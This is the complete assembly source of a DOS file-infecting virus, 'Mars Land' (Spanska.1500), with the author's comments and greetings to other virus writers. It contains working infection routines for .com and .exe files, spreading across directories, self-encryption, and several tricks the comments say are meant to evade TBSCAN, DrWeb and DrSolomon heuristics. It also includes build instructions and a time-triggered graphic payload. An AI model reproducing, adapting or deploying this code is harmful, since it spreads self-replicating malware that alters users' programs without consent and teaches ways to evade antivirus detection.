; MARS LAND virus by Spanska
; Called Spanska.1500 by AV people
; This is my third virus
;
;*********************************************************************
;
;     THIS VIRUS IS DEDICATED TO... uhhh... nobody this time :) 
;  
;     Or maybe to all the virus coders who do not destruct with
;     their creations. I've put the phrase "Coding a virus can 
;     be creative" to show that an original infection routine, 
;     a funny payload or a new mutation engine, are far more 
;     interesting for the coder and for other people than stupid 
;     destruction. 
;     I worked some weeks on this virus graphic effect. A simple
;     routine to delete a hard drive would have taken me one
;     minute to copy/paste it. So, no interest. 
; 
;     Greets to Griyo (best virus coder on this side of the
;     galaxy), MrSandman and other guys from 29A (the best group!),
;     to Roadkill, Slacker, and friends on IRC (from Luxembourg,
;     Spain, Sweden and everywhere), Poltergst and Cicatrix for
;     their job on the web. And to the very few french virus
;     coders, or even fighters (salut Jean-Luc!).
;
;******************************contact me at el_gato@rocketmail.com***
;
; At the time it was released (march 97), the detection was: 
; TBSCAN flags: c?K on .exe's, nothing on .com's
; FPROT: "ear variant" on unencrypted generation 0, nothing after
; DrSolly Findvirus: nothing
; DrWeb: nothing
; AVP: nothing
; (i saw in newsgroups that a scanner i can't remember flags it 
; sometimes like a Whale variant, never happened to me)
;
; generation zero size: 1660 
; virus size:           1500 
;
; compile it with TASM /m2 and TLINK /t
;
;       Properties:
; simple .com/.exe runtime infector
; file search routine is essentially derived from my NO PASARAN virus
; not destructive
; encrypted with variable key
; infects 3 .com and 3 .exe each run
; infects current directory, than upper directories
; when it reaches the root, it starts infecting all "level1" subdirectories
; does not infect files <500 bytes, nor command.com
; the VGA graphic bomb (a 3D voxel effect) explodes 
; when minutes=30 and seconds<30 (1/120)

code    segment
	assume  ds:code, ss:code, cs:code, es:code
	org 100h
;
;---------------fake host code--------------------
;
hote:                                                   
call virus              ;jump to viral code (avoid J flag)          
signature db "ee"       ;virus signature
nop                     ;
nop                     ;fake host 
nop                     ;
nop                     ;
mov ah, 4ch             ;finished
mov al,0                ;go to
int 21h                 ;DOS

;**********************************************************************
;                     START OF VIRAL CODE
;**********************************************************************

virus:                ;virus starts here
;
;-------------in case of an exe, let's work in cs--------------
;
push ds                         ;save ds on stack... Don't forget it...

push cs                         ;we are in the virus segment
push cs                         ;so we have to adjust 
pop es                          ;ds and es to point 
pop ds                          ;to this segment 
;
;---------------get delta offset----------------------------
;
call $+3                              ;modified classic
delta:                                ;routine to
mov bp, sp                            ;avoid flag E
mov ax, [bp]                          ;
add word ptr [bp], decrypte-delta     ;thanks Slacker's Theory
sub ax, offset delta                  ;of Code through Obscurity!
mov bp, ax
ret

clef db 0                             ;the crypting key

;===        this stosb           ===
;===  when outside decrypt loop  ===
;===       does not flag #       ===
baise_flag_cryptage:            ;===      
stosb                           ;=========>>>   NO MORE FLAG "#" !!!!!  
ret                             ;===    
;===================================

;
;----------------------decrypting routine-------------------------
;
decrypte:
mov dl, [bp+offset clef]               ;actual key in dl
mov cx, fin_cryptage - debut_cryptage  ;number of bytes to decrypt 
lea si, [bp+offset debut_cryptage]     ;si=start of zone to decrypt
mov di, si                             ;di=start of zone to decrypt
xor_loop:                              ;decrypt loop
lodsb                                  ;get byte to decrypt in al
nop                                    ;just here to make a 1500 bytes virus ;)
xor al, dl                             ;the byte is decrypted with the key
call baise_flag_cryptage               ;call the outside stosb (avoid flag #)
loop xor_loop  		               ;finish decryption

debut_cryptage:                        ;start of the crypted zone
;
;------transfert of infected file information on another zone---------
;            (for final normal execution of the program)
;
lea si, [bp+offset pip]         ;from this zone
lea di, [bp+offset vip]         ;to this zone
movsw 
movsw				;we transfer 8 bytes
movsw
movsw
;
;---------------initialisation to 0 of directory counter--------------
;                and 2 infection counters (com and exe)
;
lea di, [bp+offset phase]	;they are here
xor ax, ax			;put them to zero
stosw				;(3 counters = 3 bytes)
stosb
;
;--------------------remember current repertory------------------
;
lea si, [bp+offset repert]     ;si on good memory zone
xor dl, dl                     ;dl=0 is default unit
mov ah, 47h                    ;47h=current dir in memory
int 21h                        ;go!
;
;---------------DTA go to a predefined zone in memory-------------
;
push 1a00h              ;push/pop to
pop ax                  ;avoid flag F
lea dx, [bp+offset dta] 
int 21h 

;**********************************************************************
;                     .COM INFECTION
;**********************************************************************
;
;-----------------find first .com file------------------------- 
;
recherche:
mov cx, 0007h                  ;attributes
lea dx, [bp+offset file_com]   ;file mask for a .com
mov ax, 4e00h                  ;4eh=find first file 
int 21h                        ;file found?
jnc sauter_suivant             ;yes => c=0, let's continue 
jmp infecte_exe                ;no => go to .exe infection
;
;---------------------find next .com file------------------------- 
;
fichier_suivant:
lea dx, [bp+offset file_com]   ;
mov ax, 4f00h                  ;4Fh=find next file 
mov cx, 0007h 
int 21h                        ;file found?    
jnc saut5                      ;yes => c=0, let's continue
jmp infecte_exe                ;no => go to .exe infection
saut5: 
;
;---------------verify if extension is really .com---------------------
;            (it's made to avoid flag S with tbscan)
;
sauter_suivant:
call verifie_extension         ;call verification routine
cmp word ptr [si], "MO"        ;second and third letters are "OM"?
jne fichier_suivant            ;no => find next .com file
;
;----------------verify if it's command.com----------------------------
;
cmp word ptr [bp+offset dta+1eh+2], "MM"	;test 3rd and 4th letter
je fichier_suivant 				;yes => find next file
;
;--------------attributes to 0 to infect special files-------------
;
call attrib_a_zero
;
;--------------------open file, and verify header-----------------------
;
call ouvre_et_verif_header

jmp fichier_suivant           ;if header not good (already infected)
			      ;we get here and search another file     	

;if header good we get here on routine return
;  
;--------transfer 5 first bytes of the .com to another zone----------
;
lea si, [bp+offset exehead]
lea di, [bp+offset cinq_octets]
movsw
movsw
movsb
;
;-----------before infection, change of the crypting key-----------
;
call change_clef
;
;------------disk file pointer at the end-----------
;
mov ax, 4202h                         
xor cx, cx                            
mov dx, cx                            
int 21h                               
;
;-----------------------infection-----------------------------------
;
call infecte
;
;--overwrite 5 first bytes on the disk by jump to virus code + signature---
;
;1) move disk file pointer to start of the file
;
call pointeur_debut  
;
;2) calculate initial jump and write all on a temp zone in memory
;
lea di, [bp+offset cinq_octets]
mov al, 0E8h				      ;E8=opcode of CALL
stosb
mov ax, word ptr [bp+offset dta+1ah]          ;ax=file size
sub ax, 3                                     ;this is because of the CALL
stosw
mov ax, "ee"				      ;signature
stosw
;
;3) overwrite 5 first bytes on the file
;
mov cx,5                            
lea dx, [bp+offset cinq_octets]     
call ecrit_fichier
;
;----------------restore time/date of the file--------------------
;
call restaure_time
;
;------------close file and restore file attributes--------------------
;
call remise_en_etat
;
;--------verify how many .com files we have infected------------------
;
mov byte ptr cl, [bp+offset compteur_com]   ;infection counter in cl
inc cl                                      ;one more
cmp cl, 3                                   ;have we infected 3 .com files?
je infecte_exe                              ;yes => let's infect .exe now
mov byte ptr [bp+offset compteur_com], cl   ;no => write new value of counter
;
;-----------------let's infect a new .com file------------------
;
jmp fichier_suivant                         ;go infect next file

;**********************************************************************
;                     .EXE INFECTION
;**********************************************************************

infecte_exe:
;
;------------------find first .exe file------------------------- 
;
recherche_exe:
mov cx, 0007h                  ;attributes
lea dx, [bp+offset file_exe]   ;file mask for a .exe
mov ax, 4e00h                  ;4eh=find first file 
int 21h                        ;file found?
jnc sauter_exe_suivant         ;yes => c=0, let's continue 
jmp rep_sup                    ;no => go to upper directory
;
;------------------find next file------------------------- 
;
exe_suivant:
lea dx, [bp+offset file_exe]   ;file mask for a .exe
mov ax, 4f00h                  ;4Fh=find next file 
mov cx, 0007h                  ;attributes
int 21h                        ;file found?     
jnc saut_exe                   ;yes => c=0, let's continue 
jmp rep_sup                    ;no => go to upper direcory
saut_exe:                      ;
;
;---------------verify if extension is really .com---------------
;            (it's made to avoid flag S with tbscan)
;
sauter_exe_suivant:  
call verifie_extension         ;call verification routine
cmp word ptr [si], "EX"        ;second and third letters are "OM"?
jne exe_suivant                ;no => find next .exe file
;
;------------attributes to 0 to infect special files-------------
;
call attrib_a_zero

call ouvre_et_verif_header    
jmp exe_suivant                ;if header not good (already infected or
			       ;windows file) we get here and search 
                               ;another file  

;if header good, we get here  
;
;------------verify that it's really a .exe with MZ header----------------
;
lea si, [bp+offset exehead]
lodsw
add ah, al                       ;to avoid flag Z
cmp ah, 167                      ;(M+Z in ASCII is 167)
jne exe_suivant                  ;if it's not MZ or ZM, find next .exe file
;
;-----------before infection, change the crypting key-----------
;
call change_clef
;
;----------------save old .exe header values-------------------------
;
lea di, [bp+offset pIP]
mov ax, word ptr [bp+ exehead+14h] 	;save IP
stosw
mov ax, word ptr [bp+ exehead+16h] 	;save CS
stosw
mov ax, word ptr [bp+ exehead+0Eh]	;save SS
stosw
mov ax, word ptr [bp+ exehead+10h]   	;save SP
stosw
;
;---------disk file pointer at the end (return dx:ax = size)--------- 
;
mov bx, [bp+offset handle]
mov ax, 4202h
xor cx, cx
xor dx, dx
int 21h

push ax                               ;save size on stack
push dx				      ;useful for next calculations
;
;----------------calculate new cs:ip---------------------------------
;
push ax
mov ax, word ptr [bp+exehead+08h]
mov cl, 4
shl ax, cl
mov cx, ax
pop ax
sub ax, cx
sbb dx, 0

mov cl, 0Ch
shl dx, cl
mov cl, 4
push ax
shr ax, cl
add dx, ax
shl ax, cl
pop cx
sub cx, ax

mov  word ptr [bp+ exehead+14h], cx           ;new calculated values
mov  word ptr [bp+ exehead+16h], dx           ;put in the header zone
mov  word ptr [bp+ exehead+0Eh], dx           ;in memory
mov  word ptr [bp+ exehead+10h], 0FFFEh    
;
;-----------------calculate new size---------------------------
;
pop dx
pop ax
push ax
add ax, fin_cryptage-virus
adc dx, 0
mov cl, 7
shl dx, cl
mov cl, 9
shr ax, cl
add ax, dx
inc ax
mov  word ptr [bp+ exehead+04h], ax    
pop ax
add ax, fin_cryptage-virus 
and ah, 1
mov word ptr [bp+ exehead+02h], ax    
;
;-----------------write signature----------------------------------
;
mov word ptr [bp+exehead+12h], "ee"
;
;--------------------infection---------------------
;
call infecte
;
;----------write new header of the infected file on disk---------------------
;
mov ax, 4200h        
push ax                 ;this stupid push/pop
pop ax                  ;to avoid DrWeb heuristic
xor cx, cx
xor dx, dx
int 21h                 ;pointer at start of file on disk

mov cx, 1Ch
lea dx, [bp+exehead]
call ecrit_fichier      ;write on disk modified header
;
;----------restore time/date of the file--------------------
;
call restaure_time
;
;----------close file and restore file attributes----------------------
;
call remise_en_etat
;
;--------verify how many .exe files we have infected------------------
;
mov byte ptr cl, [bp+offset compteur_exe]   ;counter in cl
inc cl                                      ;one more
cmp cl, 3                                   ;we infect 3?
je bombe_ou_pas                             ;yes => let's stop infections
mov byte ptr [bp+offset compteur_exe], cl   ;no => write counter
;
;--------let's infect a new .exe file------------------
;
jmp exe_suivant                             ;go infect next file
;  
;--------------------does the bomb explode?---------------------
;
bombe_ou_pas:
mov ah, 2Ch               ;internal clock: ch=hour et cl=minute
int 21h
cmp cl, 30d               ;minutes = 30?
jne redonne_main          ;no => return to host
cmp dh, 30d               ;yes => test seconds
ja redonne_main           ;if secondes > 30 we return to host
jmp bombe                 ;if seconds <30 (1/120) the bomb explodes 

;**********************************************************************
;                     RETURN TO HOST
;**********************************************************************

redonne_main:

;------------------DTA in the normal zone-----------------------------
;            (to avoid perturbing host program)
;
push 1a00h                      ;push/pop 
pop ax                          ;to avoid flag F
mov dx, 80h                     ;to 80h, the normal zone
int 21h
;
;--------restore the directory in which we were when we started-----------
;
lea dx, [bp+offset repert] 
mov ax, 3B00h                   ;3bh=change directory
int 21h 
;
;-----------active host is a .com or a .exe?-------------------
;
cmp byte ptr cs:0, 0CDh         ;a .com file have an Int20h
je redonne_main_com             ;(word CD 20) at offset 0
;
;-------------return to an .exe---------------------------
;
redonne_main_exe:

pop ds                                ;remember the very first push ds
push ds
pop es				      ;get es=ds

mov ax, es
add ax, 10h
add word ptr cs:[bp+vCS], ax
cli
add ax, word ptr cs:[bp+vSS]	      ;adjust stack pointers
mov ss, ax
mov sp, word ptr cs:[bp+vSP]
sti
jmp retour_au_prog

cinq_octets:
pip db 90h,90h                  ;zone to keep file information
pcs db 90h,90h                  ;EXE: keep ip, cs, ss, sp
pss db 90h,90h                  ;COM: keep 5 first bytes
psp db 90h,90h

retour_au_prog:
db 0EAh                         ;far jump opcode, for .exe
contenu: 
vIP dw 0                        ;zone to keep temporarly file info
vCS dw 0                        ;EXE: keep ip, cs, ss, sp 
vSS dw 0                        ;COM: keep 5 first bytes   
vSP dw 0
;
;-----------------------return to a .com---------------------------
;
redonne_main_com:
pop ax                            ;clean stack (remember first push ds)
;
;---------replace 5 first bytes of the host in memory----------
;
lea si, [bp+offset contenu]       ;memory zone where they are
mov ax, 101h                      ;this is to
dec ax                            ;avoid flag B in TBSCAN
mov di, ax                        ;a .com start at offset 100h
movsw 
movsw 
movsb                             ;move 5 bytes
;
;-----------------------return to host----------------------------
;    (remember the very first CALL: we have 103h on the stack) 
;
redonner_la_main:
pop ax                    ;get 103h
sub ax, 3                 ;we want 100h
push ax                   ;re-put it on stack (for the RET)
xor ax, ax                ;a starting program
xor bx, bx                ;likes to find all
xor cx, cx                ;registers equals
xor dx, dx                ;to zero
ret                       ;return to normal program

;**********************************************************************
;                        CHANGE DIRECTORY
;**********************************************************************

;
;----------climb to upper directory--------------------------
;
rep_sup:                        
lea dx, [bp+offset dot]         ;let's go to ".." repertory
mov ah, 3bh
int 21h                         ;are we in the root?
jc on_redescend                 ;yes => c=1, let's go down now
jmp recherche                   ;no => find first file
;
;---if we are in root, let's go to all "first-level" subdirectories------- 
;
on_redescend:
mov ah, 4eh                         ;find first file
mov cx, 16                          ;with directory attribute
lea dx, [bp+offset dir_masque]      ;called "*.*"
int 21h                             ;one found?
jnc contin			    ;yes => continue
jmp bombe_ou_pas                    ;no => test time for the bomb
contin:

cmp byte ptr[bp+offset phase], 0    ;how is the dir counter (called phase)?
je le_premier                       ;phase=0 => do not find next dir
 
xor bh, bh
mov bl, byte ptr [bp+offset phase]  ;bx=phase

rep_suivant:                     ;loop to avoid all subdir already infected
mov cx, 16                       ;directory attributes
mov ah, 4fh                      ;find next dir
int 21h                          ;one found?
jnc contin2			 ;yes => continue
jmp bombe_ou_pas                 ;no => test time for the bomb
contin2:

cmp byte ptr [bp+offset dta+15h], 16  ;is it really a directory?
jne rep_suivant			      ;no => find next

dec bx                           ;this routine is made to infect
cmp bx, 0                        ;directory "number phase"
jne rep_suivant                  ;if bx<>0, the subdir is already infected
    
le_premier:
add byte ptr[bp+offset phase], 1    ;OK, we are on a subdir not infected

lea dx, [bp+offset dta+1eh]         ;so, let's change
mov ah, 3bh                         ;directory to it
int 21h 

jmp recherche                       ;and infect this new subdirectory

;**********************************************************************
;                 ROUTINE OFTEN USED (to save bytes)
;**********************************************************************

;-------------------verify extension-------------------------

verifie_extension:
mov cx, 13d                    ;max size of a file name (not really, but
lea si, [bp+offset dta+1eh]    ;who cares? I've stolen this routine somewhere)
compare:                       ;loop for detecting start of the extension
lodsb                          ;letter in al
cmp al, "."                    ;is it a point?
jne compare                    ;no => test next letter
inc si                         ;yes => si points on second extension letter
ret

;------------------change crypting key---------------

change_clef:
mov ah, 2Ch                        ;internal clock 
int 21h                            ;cx get quite randomic
mov [bp+offset clef], cl           ;let's keep it somewhere
ret

;------------------------open file-------------------------

ouvre_et_verif_header:
mov ax, 3D02h                  ;3D02h=open file
lea dx, [bp+offset dta+1eh]    ;name of the file in DTA
int 21h 
jnc saut2                      ;one file found, c=0, continue 
jmp remise_en_etat             ;not found => arrange file
saut2:                         ;continue
mov [bp+offset handle],ax      ;keep handle in memory
;         
;----------------read first 1Ch bytes of the file-----------------
;
xchg ax, bx                          ;handle in ax   
mov cx, 1Ch                          ;number of bytes to read
mov ax, 3F00h                        ;3F=read file
lea dx, [bp+offset exehead]          ;dx on stockage zone
int 21h
jnc saut3                            ;no problem, c=0, continue 
jmp remise_en_etat                   ;problem => arrange file
saut3:                               ; continue
;
;-----------is the file already infected?-------------
;
cmp byte ptr [bp+offset exehead+18h], 40h    ;is it a windows file? 
jz deja_infecte                              ;yes => don't touch
cmp word ptr [bp+offset exehead+3], "ee"     ;.com already infected? 
jz deja_infecte                              ;yes => don't touch
cmp word ptr [bp+offset exehead+12h], "ee"   ;.exe already infected?
jnz saut4                                    ;no => continue
deja_infecte:
jmp remise_en_etat             ;let's arrange the file
saut4:                         ;continue
;
;--------------------is the size correct?-------------------
;
cmp [bp+offset dta+1ah], 500	     ;do not infect if file<500 bytes
ja verif_ok                          ;it's OK
;
;--------arrange file and close it in case of non-infection-----------
;
remise_en_etat:
mov ah, 3Eh                          ;3Eh=close file
int 21h 
;
;-----------------restore file attributes-----------------------
;
call restaure_attrib		     ;restore attributes
;
;------after arranging the file, let's go back to the CALL-------
;
ret
;
;----------------------if it's good to infect,-------------------
;             let's go back one instruction after the call
;
verif_ok:
pop ax              ;get offset of the return on the stack
add ax, 2           ;add 2 (size of a short JMP)
push ax             ;put it back on the stack
ret                 ;return 2 bytes after the call

;-----------------------------infection--------------------------

;first, let's write non-encrypted part

infecte:
mov cx, debut_cryptage - virus       ;size of non-encrypted part 
lea dx, [bp+offset virus]            ;dx on beginning of this part
call ecrit_fichier		     ;write this on disk

;second, let's crypt next part in memory

mov dl, [bp+offset clef]               ;dl=new key   
lea si, [bp+offset debut_cryptage]     ;si=start of crypted zone
lea di, [bp+offset zone_de_travail]    ;di=temp memory zone for crypting
mov cx, fin_cryptage - debut_cryptage  ;cx=number of bytes to crypt
crypte_et_transfere:                   ;the loop
lodsb                                  ;get original byte
xor al, dl                             ;crypt it
stosb                                  ;put it on memory
loop crypte_et_transfere               ;again

;third, disk writing of the crypted zone

mov cx, fin_cryptage - debut_cryptage  ;number of bytes to write
lea dx, [bp+offset zone_de_travail]    ;dx=offset of the temp zone
call ecrit_fichier		       ;write it on disk
ret

;-------------------modify attributes-------------------------

attrib_a_zero:
xor cx, cx                             ;if we want to put attrib to zero        
jmp suite_attrib

restaure_attrib:
xor ch, ch                             ;if we want to restore attrib
mov cl, byte ptr [bp+offset dta+15h]   ;from the DTA value

suite_attrib:
lea dx, [bp+offset dta+1eh]            ;file name
push 4301h                             ;43h=change attribs
pop ax                                 ;avoid flag F from TBSCAN
int 21h
ret

;---------------------restore file time/date-----------------------

restaure_time:
mov dx, word ptr [bp+offset dta+18h]   ;date from DTA to dx
mov cx, word ptr [bp+offset dta+16h]   ;time from DTA to cx
push 5701h                             ;5701h=change time/date
pop ax                                 ;avoid flag F from TBSCAN
int 21h
ret

;------------------write file on disk----------------------

ecrit_fichier:
push 4000h                      ;the famous 40Hex... push/pop to
pop ax                          ;avoid DrSolomon and DrWeb heuristic
int 21h
ret

;--------------------move pointer on disk---------------------------

pointeur_debut:			;to put pointer at the beginning
xor dx, dx			
pointeur_debut_sans_dx:		;i think i don't use this... never mind
xor cx, cx
mov ax, 4200h			;42h=move disk pointer
push ax				;stupid push/pop to avoid
pop ax				;DrWeb heuristic
int 21h                        
ret

;**********************************************************************
;          CODE OF THE GRAPHIC BOMB: A 3D VOXEL EFFECT
;**********************************************************************
bombe:
largeur equ 128				;size of the grid

;-------------------------VGA-------------------------------

mov ax, 13h     
int 10h         

;----------------------black palette--------------------------------
;     because mountains are calculated directly on screen)

mov dx, 3c8h    ;dx = palette port
xor al, al      ;start with color 0
out dx, al      ;write first color in the port
inc dx          ;define all others colors
mov cx, 768     ;256 colors x 3 composantes, all at zero
tout_noir:                 
out dx, al      ;write black on port
loop tout_noir

;---------draw to an area of the screen some big blocks----------
;       area used: 50 lines x 128 columns on the left top

mov ax, 0A000h         ;video memory
mov es, ax             ;in es
mov cx, 150            ;number of blocks
boucle:
     mov ax, [bp+offset aleat]       
     mov dx, 8405h                   ;semi-random routine stolen
     mul dx                          ;in a fire demo
     inc ax			     ;give a random dx
     mov [bp+offset aleat], ax
push dx                ;dl = random byte for the line
shr dl, 1              ;now 0<dl<128
shr dl, 1              ;now 0<dl<64  
cmp dl, 41             ;if dl>41
ja pas_pixel           ;we don't draw it
cmp dl, 5              ;if dl<5
jb pas_pixel           ;we don't draw it
mov ax, 320            ;calculation of video offset
xor dh, dh             ;we have to multiply just dl
mul dx                 ;by 320
pop dx                 ;dh = random byte for the column
cmp dh, 112            ;if dh>112
ja pas_pixel           ;we don't draw it
cmp dh, 8              ;if dh<8
jb pas_pixel           ;we don't draw it
xor dl, dl             ;we have to multiply just dh
xchg dl, dh            ;we put it in dl 
add ax, dx             ;let's add line*320 and column => random place
xchg di, ax            ;this random offset in di
mov al, 255            ;big blocks are in color 255
push cx		       ;save loop counter
mov bl, 4              ;blocks are 4 pixels tall
gros_pixel:
mov cx, 10             ;blocks are 10 pixels wide
rep stosb              ;write them on screen...
add di, 310	       
dec bl
jne gros_pixel
pop cx
pas_pixel:
loop boucle

;-----soften blocks to get mountains, by a immobile fire effect----------

;here es=video
mov ax, cs               ;get cs                 
add ah, 16               ;add to it 256*16 bytes to get ds 
mov ds, ax               ;ds now points on a free segment (i hope so :)
push ds                  ;on the stack (cf [@@] later)

mov bl, 25               ;bl = number of degradation cycles
cycle:
xor si, si               ;ds:si=free segment
xor di, di               ;es:di=video
xor ax, ax
mov cx, 50*320           ;we degrade on 50 first lines of the screen
degrade:
mov al, es:[di-1] 
add al, es:[di+1]
adc ah,0
add al, es:[di+320]      ;sum all pixels colors around offset di
adc ah,0 
add al, es:[di-320] 
adc ah,0
shr ax, 1
shr ax, 1                ;divide this color by 4, so it's the average
je pas_dec               ;if color=0, color stays to 0
dec al                   ;on other case, we decrement color
pas_dec:
mov byte ptr ds:[si], al ;new color value in free segment
inc si                  
inc di
loop degrade             ;loop for all the 50x128 area
	
xor si, si               ;one degradation cycle finished:
xor di, di               ;we copy all the area 
mov cx, (50*320)/2       ;from the free segment
rep movsw                ;to video memory
	
dec bl                   ;one cycle more
jne cycle                ;25 cycles? No => again

			 ;we now have on the screen (but we can't see it 
			 ;because all is black) soft spots, this is the
			 ;landscape in 2D

;--------------creation of the 3D table (x,y,z)------------------------
;        from the 2D landscape on screen; this table is 
;   128x50x(1+1+2) = 25 Ko, this is why we need one free segment

;here es=video  ds=free segment
push es                 ;we want ds=video et es=free segment
push ds
pop es
pop ds

mov cx, largeur*50+2    ;there will be 128x50 coordinates (+2 for security)
xor si, si              ;start of video memory
xor di, di              ;start of free segment
mov dl, 128             ;we need a line counter
table:

mov ah, dl              ;the X (left/right): between 0 and 128
shl ah, 1               ;now between 0 and 256
mov al, 128
sub al, ah              ;now between -128 and +128
stosb                   ;put it on free segment

movsb                   ;the Y (top/bottom) is directly the pixel color
dec dl                  ;see if we are at the end of the line
jne pas_fin_de_ligne    ;if dl<>0 we are not
mov dl, 128             ;if dl=0 the line counter is re-put to 128
add si, 320-largeur     ;and the video offset go to next line
pas_fin_de_ligne:

mov ax, cx              ;the Z (near/far): between 0 and 50*128
shl ax, 1               ;now between 0 and 50*256
xor al, al              ;we just need ah (between 0 and 50)
xchg ah, al             ;put it on al
shl al, 1               ;now between 0 and 100
shl al, 1               ;now between 0 and 200
add ax, 0080h           ;now between 128 and 328 (nearest Z will be 128)
stosw                   ;put it on free segment
loop table		;calculate all table

;------------------delete the 2D landscape------------------------

;here ds=video  es=free segment    
push ds
pop es
xor di, di              ;from the beginning of screen
mov cx, (320*50)/2      ;delete all the 50 lines
xor ax, ax              ;with words=0, faster than bytes
rep stosw		;delete all

;---------put text cursor at good coordinates on screen-----------------

mov dx, 030Ah      ;dh, dl = line/column coordinates 
xor bh, bh         ;on page 0
mov ah,02h         ;int BIOS 02h=put cursor
int 10h            
						    
;--------------write the 2 text messages-------------------------

;ici ds=es=video     
push cs
pop ds
lea si, [bp+offset message]     ;si points on message
mov cx, 21                      ;message length
affiche_message:
	lodsb		        ;get letter
	mov bl, 125             ;color=red
	mov ah, 0Eh             ;int BIOS OEh=write one letter
	int 10h         
loop affiche_message

add dx, 507		        ;adjust coordinates for second message
mov ah, 02h                     ;int BIOS 02h=put cursor
int 10h
lea si, [bp+offset messag2]     ;si points on message
mov cx, 32                      ;message length
affiche_messag2: 
	lodsb                   ;get letter
	mov bl, 50              ;color=yellow
	mov ah, 0Eh             ;int BIOS OEh=write one letter
	int 10h
loop affiche_messag2

;------------------adjust martian palette----------------------------

	mov dx, 3c8h    ;dx = palette port
	xor al, al      ;start with color 0
	out dx, al      ;write first color in port
	inc dx          ;define all other colors
	
	xor cx, cx      ;starts with black
rouges:
	mov al, cl 
	out dx, al      ;loop to define all 63 first colors
	xor ax, ax      ;with a growing red
	out dx, al
	out dx, al
inc cl             
cmp cl, 63
jne rouges

	xor cx, cx 
jaunes:
	mov al, 63
	out dx, al
	mov al, cl      ;loop to define 63 next colors
	out dx, al      ;with a growing green
	xor al, al
	out dx, al
	inc cx
	cmp cx, 63
jne jaunes 


;-------------------animation of the landscape------------------------

;here ds=cs, es=video
pop ds                         ;ds points to free segment [@@] see above
anime:                         ;get here when one screen is totally drawn
mov cx, largeur*50             ;we will draw 50x128 voxels
xor si, si                     ;ds:si=where 3D coordinates are (free seg)
xor di, di                     ;es:di=video
dessine:                       ;get here when one voxel is drawn
lodsb                          ;put X in al
xchg dl, al                    ;transfer it in dl
lodsb                          ;put Y in al
xchg bl, al                    ;transfer it in bl
mov byte ptr bh, ds:[si+3+4]   ;put NEXT_Y (for the shadow effect) in bh
lodsw                          ;put Z in ax
mov word ptr cs:[bp+offset z], ax ;not enough registers: put Z in memory
cmp ax, 0080h                  ;is the voxel at the nearest limit?
ja ca_sort_pas                 ;no => it can advance more
add ax, 200                    ;yes => return at the farest limit
ca_sort_pas:
dec ax                         ;it advances: the Z decrements
mov word ptr ds:[si-2], ax     ;and we write this new Z as new coordinate

;------calculate xx and yy (2D screen) from x, y and z (3D space)------
;                      by a perspective effect
;      (remember: X is in dl, Y in bl, Z in its memory location)

push cx                          ;we will need cx here, so save it on stack  
xchg ah, dl                      ;X coordinate from dl to ah
cmp ah, 128                      ;X positive?
jb suite5                        ;yes => no problem
neg ah                           ;no => let's "positive" it
mov byte ptr cs:[bp+offset signe],1 ;and let's remember it was negative
suite5:                          ;NB: calculations are in "fixed point" mode
xor al, al                       ;X is in ah: same "order" than Z (word)
xor dx, dx                       ;dx will not fuck up the division     
div word ptr cs:[bp+offset z]    ;X/Z
push ax                          ;result is the 2D coordinate (XX), push it
 
mov al, bl                       ;Y coordinate from bl to al
mov cl, 4                        ;divise Y/16 to have a mountain height
shr al, cl                       ;between 0 and 16
mov ah, 80                       ;beware: mountains are "top on bottom" 
sub ah, al                       ;level 0 = altitude 80, so soustraction
				 ;('cause in VGA 0,0 = top left)
xor al, al                       ;"fixed point" mode: Y is now in ah   
xor dx, dx                       ;dx will not fuck up the division   
div word ptr cs:[bp+offset z]    ;Y/Z
xchg cx, ax                      ;the result is the 2D coordinate (YY) 

;---------------calculate video offset of the voxel-------------------
;            (remember: XX is on stack and YY is in CX)

pop dx                               ;get XX
cmp cx, 142                          ;do not write voxel if too at bottom  
ja pas_plot
cmp dx, 155                          ;do not write voxel if too on the side
ja pas_plot

push dx                              ;put again XX on stack
mov ax, 320                          ;we gonna calculate voxel video offset
mul cx                               ;multiply YY by 320
pop dx                               ;get XX
cmp byte ptr cs:[bp+offset signe], 1 ;are X and so XX negatives?
jne pos
sub ax, dx                           ;yes => offset is ax - XX
mov byte ptr cs:[bp+offset signe], 0 ;and we can forget this sign now
jmp suite4
pos:
add ax, dx                           ;no => offset is ax + XX

suite4:
add ax, (320*60)+160                 ;to put the animation at screen bottom

;--------calculate voxel color (with 2 shadow effects)------------------

;first shadow effect, depends on curvature of mountain sides

mov di, ax                           ;ax is video offset of the voxel
xchg ax, bx                          ;remember: bx contains Y et NEXT_Y
sub al, ah                           ;shadow will depend on NEXT_Y - Y; can
add al, 100                          ;be >0 (one side of the mountain)
				     ;or <0 (other side), so add an 
				     ;average value

;if voxel is too far, put it black

mov word ptr bx, cs:[bp+offset z]    ;now bx=Z (remember 128<Z<328)
cmp bx, 285                          ;is voxel very far?
jb pas_eteindre                      ;no => OK, write it
xor al, al                           ;yes => write a black voxel instead
pas_eteindre:                        

;second shadow effect: the farest, the darkest

shr bx, 1                            ;now 64<bx<164
shr bx, 1                            ;now 32<bx<82
sub ax, bx                           ;sub the color with the distance

;--------calculate voxel size (the nearest, the biggest)----------------   

mov bx, 328               ;maximum Z
sub bx, cs:[bp+offset z]  ;now bx=0 (far) or bx=200 (near)
mov cl, 6                 ;divide by 64
shr bx, cl                ;now 0<bx<3
inc bx                    ;now 1<bx<4 
inc bx                    ;now 2<bx<5 (number of pixels wide)
mov dx, 2                 ;voxel will be always 2 lines height.

dessine_voxel:
mov cx, bx                ;number of pixels wide in cx
rep stosb                 ;write them on screen
mov cx, 320               ;we have to draw second line
sub cx, bx                ;adjust with voxel wide
add di, cx                ;go to offset of next line
dec dx                    ;first line finihed
jne dessine_voxel         ;draw second line

pas_plot:                 ;we get here in case of too extreme coordinates

pop cx                    ;don't forget the counter
dec cx                    ;one voxel more is drawn
je suite9                 ;if all voxels are drawn, start another screen
jmp dessine               ;go calculate next voxel
suite9:         
						   
jmp anime                 ;go calculate next screen

;---------------memory zones used by the graphic effect------------------

message db "Mars Land, by Spanska"		;message 1
messag2 db "(coding a virus can be creative)"   ;message 2
aleat dw 0FAh					;random seed
z dw 3            				;temporarly used for Z
signe db ?					;to remember the sign of X
;
;--------------------memory zones used by the virus----------------------
;
dir_masque db "*.*",0           ;to find subdirectories
file_com   db "*.C*",0          ;to find .com files
file_exe   db "*.E*",0		;to find .exe files
dot        db "..",0            ;to climb on superior directory
fin_cryptage:                   ;end of crypted zone
;
;-------------all the following is not written on disk------------------
;            (temporarly memory zone used by the virus)
;
phase        db 0                 ;subdirectory counter
compteur_com db 0                 ;.com infection counter
compteur_exe db 0                 ;.exe infection counter
handle       db 0,0               ;handle of current file
dta          db 48 dup (0AAh)     ;temporary DTA
